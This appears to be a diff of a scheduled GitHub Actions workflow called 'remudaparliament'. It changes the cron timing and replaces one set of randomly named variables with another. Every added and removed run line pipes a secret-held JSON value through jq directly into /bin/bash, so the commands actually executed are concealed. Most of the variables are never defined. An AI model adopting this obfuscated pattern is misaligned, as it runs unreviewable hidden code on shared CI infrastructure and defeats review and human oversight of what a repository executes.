@@ -2,8 +2,7 @@ name: remudaparliament
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 5/6 * * *'
-
+    - cron: '58 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,20 +10,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: remudaparliament
         env:
-          xz4: ${{ secrets.xz4 }}
+          sz0112: ${{ secrets.sz0112 }}
         run: |
-          echo $xz4 | jq -r .cfz97638 | /bin/bash
-          echo $c227 | jq -r .wb60961 | /bin/bash
-          echo $zlr758 | jq -r .hl80768 | /bin/bash
-          echo $n46281 | jq -r .g57 | /bin/bash
-          echo $cobys12 | jq -r .kip6274 | /bin/bash
-          echo $b97 | jq -r .vrei143 | /bin/bash
-          echo $cyku749 | jq -r .lrfeg1119 | /bin/bash
-          echo $a4 | jq -r .xszgb990 | /bin/bash
-          echo $s79321 | jq -r .nyhdn67 | /bin/bash
-          echo $xs22 | jq -r .m0 | /bin/bash
-          echo $ibx81051 | jq -r .h9 | /bin/bash
-          echo $lrp19149 | jq -r .o351 | /bin/bash
-          echo $vx846 | jq -r .zut9227 | /bin/bash
-          echo $qle05 | jq -r .u2832 | /bin/bash
+          echo $sz0112 | jq -r .w24 | /bin/bash
+          echo $bi12301 | jq -r .tzgpj5197 | /bin/bash
+          echo $sfedk01 | jq -r .lk5 | /bin/bash
+          echo $qcguk13 | jq -r .kp30304 | /bin/bash
+          echo $yzryu48453 | jq -r .sud546 | /bin/bash
+          echo $txw50 | jq -r .v858 | /bin/bash
+          echo $vgxp44879 | jq -r .m878 | /bin/bash
 
